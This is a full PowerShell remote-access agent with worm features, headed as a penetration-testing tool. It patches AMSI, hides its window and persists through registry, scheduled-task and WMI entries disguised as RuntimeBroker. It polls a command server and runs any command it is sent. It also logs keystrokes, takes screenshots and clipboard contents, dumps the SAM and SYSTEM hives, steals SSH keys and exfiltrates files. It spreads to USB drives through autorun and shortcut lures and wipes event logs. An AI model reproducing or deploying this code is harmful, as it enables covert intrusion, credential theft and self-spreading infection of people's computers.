# WiZZA PS Agent v2 — authorized pen testing only

# ── AMSI bypass (AmsiScanBuffer patch via reflection) ─────────────────────────
# String literals are char-array encoded to avoid AMSI pre-scan
function _AB {
  $amsi=[string][char[]](97,109,115,105,46,100,108,108)
  $scan=[string][char[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114)
  try {
    $t=@"
using System;using System.Runtime.InteropServices;
public class _W{
  [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
  [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,[uint]s,uint f,out uint o);
}
"@
    Add-Type $t -EA SilentlyContinue
    $l=[_W]::LoadLibrary($amsi)
    $a=[_W]::GetProcAddress($l,$scan)
    $p=0;[_W]::VirtualProtect($a,[uint32]6,0x40,[ref]$p)|Out-Null
    $pt=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
    [Runtime.InteropServices.Marshal]::Copy($pt,0,$a,6)
  } catch {}
}
_AB

# ── Hide window ───────────────────────────────────────────────────────────────
try {
  Add-Type -Name _H -Namespace _W -MemberDefinition @'
[DllImport("kernel32")]public static extern IntPtr GetConsoleWindow();
[DllImport("user32")]public static extern bool ShowWindow(IntPtr h,int n);
'@ -EA SilentlyContinue
  [_W._H]::ShowWindow([_W._H]::GetConsoleWindow(),0)|Out-Null
} catch {}

# ── Config ────────────────────────────────────────────────────────────────────
$C2="__C2URL__"
$D="$env:APPDATA\Microsoft\Windows\RuntimeBroker"
$AP="$D\RuntimeBroker.ps1"
$IF="$D\.id"
$PMin=8; $PMax=25

# ── SSL — ignore self-signed cert ────────────────────────────────────────────
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12

# ── Agent ID ──────────────────────────────────────────────────────────────────
function _ID {
  if(Test-Path $IF){return(gc $IF -Raw -EA 0).Trim()}
  $id="w"+-join((48..57+97..102)|Get-Random -C 7|%{[char]$_})
  md $D -Force -EA 0|Out-Null
  $id|sc $IF -Enc utf8 -NL -EA 0
  $id
}
$AID=_ID

# ── Jitter sleep ──────────────────────────────────────────────────────────────
function _JS { Start-Sleep($PMin+[int](Get-Random -Max($PMax-$PMin))) }

# ── HTTP comms — realistic browser headers ────────────────────────────────────
$_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
function _G($p) {
  try {
    $w=[System.Net.WebClient]::new()
    $w.Headers["User-Agent"]=$_UA
    $w.Headers["Accept"]="application/json, text/plain, */*"
    $w.Headers["Accept-Language"]="en-US,en;q=0.9"
    $w.Headers["Cache-Control"]="no-cache"
    return $w.DownloadString("$C2$p").Trim()
  } catch { return "" }
}
function _P($p,$b) {
  try {
    $w=[System.Net.WebClient]::new()
    $w.Headers["User-Agent"]=$_UA
    $w.Headers["Content-Type"]="text/plain"
    $w.UploadString("$C2$p",[string]$b)|Out-Null
  } catch {}
}

# ── Shell execution ───────────────────────────────────────────────────────────
function _R($c) { try{$o=cmd/c $c 2>&1|Out-String;if($o.Trim()){$o}else{"(no output)"}}catch{"(err:$_)"} }
function _PS($c){ try{$o=iex $c 2>&1|Out-String;if($o.Trim()){$o}else{"(no output)"}}catch{"(err:$_)"} }

# ── Register ──────────────────────────────────────────────────────────────────
function _Reg {
  $os=[Uri]::EscapeDataString([Environment]::OSVersion.VersionString)
  $h=[Uri]::EscapeDataString($env:COMPUTERNAME)
  $u=[Uri]::EscapeDataString($env:USERNAME)
  $priv=if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")){"ROOT"}else{"USER"}
  return _G "/agent/register?id=$AID&os=$os&hostname=$h&user=$u&priv=$priv&type=worm-windows"
}

# ── Persistence — Registry + Sched Task + WMI subscription ───────────────────
function _Persist {
  try {
    md $D -Force -EA 0|Out-Null
    if(-not(Test-Path $AP)){ cp $PSCommandPath $AP -Force -EA 0 }
    (gi $D -Force -EA 0).Attributes="Hidden,System"
    (gi $AP -Force -EA 0).Attributes="Hidden"
    $cmd="powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -File `"$AP`""
    # 1 — Registry Run key
    sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MicrosoftRuntimeBroker" $cmd -Force -EA 0
    # 2 — Scheduled task (survives logoff, runs as SYSTEM if admin)
    schtasks /create /tn "MicrosoftWindowsRuntimeBrokerCache" /tr $cmd /sc onlogon /rl highest /f 2>$null|Out-Null
    # 3 — WMI event subscription (survives registry cleaning)
    try {
      $ns="root\subscription"
      $q="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
      $fc=[wmiclass]"\${ns}:__EventFilter"; $f=$fc.CreateInstance()
      $f.Name="MsRTBroker"; $f.QueryLanguage="WQL"; $f.Query=$q; $f.Put()|Out-Null
      $cc=[wmiclass]"\${ns}:CommandLineEventConsumer"; $c=$cc.CreateInstance()
      $c.Name="MsRTBroker"; $c.CommandLineTemplate=$cmd; $c.Put()|Out-Null
      Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding `
        -Arguments @{Filter=$f;Consumer=$c} -EA SilentlyContinue|Out-Null
    } catch {}
  } catch {}
}

# ── RECON ─────────────────────────────────────────────────────────────────────
function _Recon {
  $r=@(
    "=== SYSTEM ==="
    "OS:     $([Environment]::OSVersion.VersionString)"
    "Host:   $env:COMPUTERNAME   User: $env:USERNAME   Domain: $env:USERDOMAIN"
    "Arch:   $env:PROCESSOR_ARCHITECTURE"
    "PS:     $($PSVersionTable.PSVersion)"
    "Admin:  $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
    ""
    "=== NETWORK ==="
    (ipconfig 2>$null|Out-String)
    ""
    "=== AV/EDR ==="
    (Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct -EA 0|
      select displayName,productState|ft|Out-String)
    ""
    "=== PROCESSES (top 30) ==="
    (Get-Process|sort CPU -Desc|select -First 30|select Name,Id,CPU|ft|Out-String)
    ""
    "=== ENV VARS ==="
    (gci env:|%{"$($_.Name)=$($_.Value)"}|select -First 30|Out-String)
  )
  $r-join"`n"
}

# ── Screenshot → base64 ───────────────────────────────────────────────────────
function _SS {
  try {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing -EA 0
    $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp=[System.Drawing.Bitmap]::new($s.Width,$s.Height)
    $g=[System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)
    $ms=[System.IO.MemoryStream]::new()
    $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
    [Convert]::ToBase64String($ms.ToArray())
  } catch { "SCREENSHOT_FAILED: $_" }
}

# ── Clipboard ─────────────────────────────────────────────────────────────────
function _Clip {
  try { Add-Type -AssemblyName System.Windows.Forms -EA 0; [Windows.Forms.Clipboard]::GetText() }
  catch { "no clipboard" }
}

# ── Browser credentials ───────────────────────────────────────────────────────
function _Browsers {
  $r=@("=== BROWSER DATA ===")
  $chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
  $edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
  $ff_base="$env:APPDATA\Mozilla\Firefox\Profiles"
  foreach($db in @($chrome,$edge)) {
    if(Test-Path $db) { $r+="DB found ($([int]((gi $db).Length/1KB))KB): $db" }
  }
  if(Test-Path $ff_base) {
    $profiles=gci $ff_base -EA 0
    $profiles|%{
      $kf="$($_.FullName)\key4.db"; $lf="$($_.FullName)\logins.json"
      if((Test-Path $kf) -and (Test-Path $lf)) { $r+="Firefox profile: $($_.FullName)" }
    }
  }
  # Credential Manager
  $r+=""; $r+="=== CREDENTIAL MANAGER ==="
  try { cmdkey /list 2>$null|%{if($_.Trim()){$r+=$_}} } catch {}
  # IE/Edge saved passwords
  try {
    $r+=""; $r+="=== IE/EDGE SAVED CREDS ==="
    (Get-StoredCredential -EA 0)|%{$r+="$($_.UserName) @ $($_.Target)"}
  } catch {}
  $r-join"`n"
}

# ── Hash dump ─────────────────────────────────────────────────────────────────
function _Hashdump {
  $r=@()
  try { $r+=_R "reg save HKLM\SAM $env:TEMP\s.tmp /y 2>&1 && reg save HKLM\SYSTEM $env:TEMP\sy.tmp /y 2>&1" }catch{}
  try { $r+=_PS "Get-LocalUser|select Name,PasswordLastSet,LastLogon,Enabled|ft|Out-String" } catch {}
  try { $r+=_R "net user 2>&1" } catch {}
  $r-join"`n"
}

# ── SSH keys harvest ──────────────────────────────────────────────────────────
function _SSHKeys {
  $r=@()
  $paths=@("$env:USERPROFILE\.ssh","$env:APPDATA\.ssh","C:\Users\*\.ssh")
  foreach($p in $paths) {
    gci $p -EA 0|?{$_.Name -match "^id_|^.*_rsa$|^.*_ed25519$"}|%{
      $r+="=== $($_.FullName) ==="; $r+=(gc $_.FullName -EA 0)
    }
  }
  if(-not$r){$r+="no SSH keys found"}
  $r-join"`n"
}

# ── Keylogger ─────────────────────────────────────────────────────────────────
$_KJob=$null
function _KStart {
  if($_KJob){return}
  $script:_KJob=Start-Job -ScriptBlock {
    Add-Type @"
using System;using System.Runtime.InteropServices;
public class KH{[DllImport("user32")]public static extern short GetAsyncKeyState(int k);}
"@ -EA SilentlyContinue
    $buf=@(); $last=""
    while($true){
      32..126+@(8,9,13,27,32)|%{
        if(([KH]::GetAsyncKeyState($_)-band 0x8001)-eq 0x8001){
          $c=[char]$_; if("$c"-ne$last){$buf+=$c;$last="$c"}
        }
      }
      if($buf.Count -gt 200){Write-Output($buf-join"");$buf=@()}
      Start-Sleep -Milliseconds 50
    }
  }
  "keylogger started"
}
function _KDump {
  if($script:_KJob){ $r=Receive-Job $script:_KJob -EA 0; if($r){return$r-join""}  }
  "no keystrokes captured"
}

# ── Privilege escalation checks ───────────────────────────────────────────────
function _Privesc {
  $r=@("=== PRIVILEGE ESCALATION VECTORS ===","")
  # Token privileges
  $r+="--- Token ---"
  $r+=_R "whoami /priv 2>&1"
  # AlwaysInstallElevated
  $aie_u=(gp "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -EA 0).AlwaysInstallElevated
  $aie_m=(gp "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -EA 0).AlwaysInstallElevated
  $r+="AlwaysInstallElevated: HKCU=$aie_u HKLM=$aie_m"
  # UAC level
  $uac=(gp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -EA 0).ConsentPromptBehaviorAdmin
  $r+="UAC ConsentPromptBehaviorAdmin: $uac (0=no prompt, 5=default)"
  # Unquoted service paths
  $r+=""; $r+="--- Unquoted Service Paths ---"
  gwmi Win32_Service -EA 0|?{$_.PathName -match '^[^"].*\s.*\.exe'}|%{
    $r+="  $($_.Name): $($_.PathName)"
  }
  # Writable service binaries
  $r+=""; $r+="--- Weak Service Perms ---"
  gwmi Win32_Service -EA 0|?{$_.State-eq"Running"}|select -First 10|%{
    $bin=($_.PathName -replace '"','') -split ' '|select -First 1
    try { $acl=Get-Acl $bin -EA 0; $acl.Access|?{$_.FileSystemRights -match "Write|FullControl"}|%{$r+="  $($_.IdentityReference) → $bin"} } catch {}
  }
  $r-join"`n"
}

# ── Document exfil list ───────────────────────────────────────────────────────
function _Exfil {
  $r=@("=== EXFIL CANDIDATES ===")
  $paths=@("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\AppData\Roaming")
  $exts=@("*.docx","*.xlsx","*.pdf","*.txt","*.kdbx","*.pem","*.key","*.p12","*.pfx","*.ovpn","*.json","*.env","*.config")
  foreach($p in $paths){
    foreach($e in $exts){
      gci $p -Filter $e -EA 0 -Recurse -Depth 3|?{$_.Length -lt 10MB}|select -First 5|%{
        $r+="$($_.FullName)  ($([int]($_.Length/1KB))KB)"
      }
    }
  }
  $r-join"`n"
}

function _GetFile($path) {
  try { [Convert]::ToBase64String([IO.File]::ReadAllBytes($path)) }
  catch { "GETFILE_ERR: $_" }
}

# ── USB spread ────────────────────────────────────────────────────────────────
function _USB {
  $r=@()
  try {
    gwmi Win32_LogicalDisk -EA 0|?{$_.DriveType-eq 2}|%{
      $drv=$_.DeviceID
      try {
        $hd="$drv\System Volume Information\.cache"
        md $hd -Force -EA 0|Out-Null
        $dst="$hd\RuntimeBroker.ps1"
        cp $PSCommandPath $dst -Force -EA 0
        (gi $hd -Force -EA 0).Attributes="Hidden,System"
        (gi $dst -Force -EA 0).Attributes="Hidden"
        "@`r`n[AutoRun]`r`nopen=powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `"$dst`"`r`nlabel=USB Drive`r`n"|
          Out-File "$drv\autorun.inf" -Enc ascii -Force -EA 0
        (gi "$drv\autorun.inf" -Force -EA 0).Attributes="Hidden,System"
        # LNK folder lure
        try {
          $sh=New-Object -ComObject WScript.Shell
          foreach($lname in @("Documents","Photos","Work Files","Backup")) {
            $lnk=$sh.CreateShortcut("$drv\$lname.lnk")
            $lnk.TargetPath="powershell.exe"
            $lnk.Arguments="-WindowStyle hidden -ExecutionPolicy Bypass -File `"$dst`""
            $lnk.IconLocation="shell32.dll,3"; $lnk.Save()
          }
        } catch {}
        $r+="$drv OK"
      } catch { $r+="$drv FAIL: $_" }
    }
  } catch {}
  if(-not$r){$r+="no removable drives"}
  $r-join"`n"
}

# ── Clean logs ────────────────────────────────────────────────────────────────
function _Clean {
  try { Remove-Item (Get-PSReadLineOption -EA 0).HistorySavePath -Force -EA 0 } catch {}
  try { wevtutil cl System 2>$null; wevtutil cl Security 2>$null; wevtutil cl Application 2>$null } catch {}
  "cleaned"
}

# ── Self destruct ─────────────────────────────────────────────────────────────
function _Destruct {
  # Remove persistence
  rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MicrosoftRuntimeBroker" -EA 0
  schtasks /delete /tn "MicrosoftWindowsRuntimeBrokerCache" /f 2>$null
  try {
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -EA 0|
      ?{$_.Name-eq"MsRTBroker"}|Remove-WmiObject -EA 0
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -EA 0|
      ?{$_.Name-eq"MsRTBroker"}|Remove-WmiObject -EA 0
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0|
      ?{$_.Filter -match "MsRTBroker"}|Remove-WmiObject -EA 0
  } catch {}
  cmd/c "ping 127.0.0.1 -n 3 >nul && del /F /Q `"$AP`" && rmdir /Q `"$D`"" 2>$null
  exit 0
}

# ── Worm control ──────────────────────────────────────────────────────────────
$_spread=$true
function _WCtrl($cmd) {
  switch($cmd) {
    "WORM_PAUSE"  { $script:_spread=$false; "paused" }
    "WORM_RESUME" { $script:_spread=$true;  "resumed" }
    "WORM_STATUS" { "spread=$_spread agent=$AID c2=$C2" }
    default       { "unknown: $cmd" }
  }
}

# ── MAIN ──────────────────────────────────────────────────────────────────────
# Background install
Start-Job -ScriptBlock {
  param($d,$ap,$src)
  md $d -Force -EA 0|Out-Null
  if(-not(Test-Path $ap)){ cp $src $ap -Force -EA 0 }
} -ArgumentList $D,$AP,$PSCommandPath|Out-Null
_Persist

# Register with retry
for($i=0;$i-lt 60;$i++){ if((_Reg)-like"*OK*"){break}; Start-Sleep 5 }

# USB spread on start (background)
if($_spread){ Start-Job -ScriptBlock{ param($f) iex $f } -ArgumentList ${function:_USB}|Out-Null }

# Main C2 loop
while($true) {
  try {
    $cmd=_G "/agent/poll?id=$AID"
    $res=""
    switch -Regex ($cmd) {
      "^$|^PING$"      {}
      "^REGISTER$"     { _Reg }
      "^EXIT$"         { exit 0 }
      "^RECON$"        { $res=_Recon }
      "^SYSINFO$"      { $res=_Recon }
      "^SCREENSHOT$"   { $b64=_SS; _P "/agent/result?id=$AID&cmd=SCREENSHOT&type=image" $b64; $res="screenshot sent" }
      "^CLIPBOARD$"    { $res=_Clip }
      "^BROWSERS$"     { $res=_Browsers }
      "^HASHDUMP$"     { $res=_Hashdump }
      "^SSHKEYS$"      { $res=_SSHKeys }
      "^KEYLOG_START$" { $res=_KStart }
      "^KEYLOG_DUMP$"  { $res=_KDump }
      "^PERSIST$"      { _Persist; $res="persistence reinstalled (registry+schtask+wmi)" }
      "^PRIVESC$"      { $res=_Privesc }
      "^DRIVES$"       { $res=(gwmi Win32_LogicalDisk -EA 0|?{$_.DriveType-eq 2}|%{$_.DeviceID})-join"`n" }
      "^SPREAD$"       { $res=_USB }
      "^EXFIL$"        { $res=_Exfil }
      "^CLEAN$"        { $res=_Clean }
      "^SELFDESTRUCT$" { _Destruct }
      "^WORM_"         { $res=_WCtrl $cmd }
      "^GETFILE (.+)"  { $res=_GetFile $matches[1].Trim() }
      "^RUN_PS (.+)"   { $res=_PS $matches[1].Trim() }
      default          { $res=_R $cmd }
    }
    if($res){ _P "/agent/result?id=$AID&cmd=$([Uri]::EscapeDataString($cmd))" $res }
  } catch {}
  _JS
}
